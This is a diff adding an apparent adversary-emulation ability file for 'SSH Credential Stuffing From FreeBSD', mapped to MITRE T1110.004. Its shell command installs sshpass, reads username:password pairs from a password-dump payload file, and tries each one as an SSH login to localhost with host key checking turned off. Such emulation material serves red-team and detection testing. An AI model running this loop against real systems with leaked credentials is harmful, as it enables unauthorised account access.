@@ -1,0 +1,20 @@
+- description: 'Using username,password combination from a password dump to login
+    over SSH.
+
+    '
+  id: f9f460ac-920b-c836-d0ee-c772f23493e2
+  name: SSH Credential Stuffing From FreeBSD
+  platforms:
+    linux:
+      sh:
+        cleanup: ''
+        command: 'if [ -x "$(command -v sshpass)" ]; then : ; else pkg install -y
+          sshpass; fi;  ;  cp 181475_credstuffuserpass.txt /tmp/; for unamepass in
+          $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d":"
+          -f2` ssh -o ''StrictHostKeyChecking=no'' `echo $unamepass | cut -d":" -f1`@localhost;done'
+        payloads:
+        - 181475_credstuffuserpass.txt
+  tactic: credential-access
+  technique:
+    attack_id: T1110.004
+    name: 'Brute Force: Credential Stuffing'
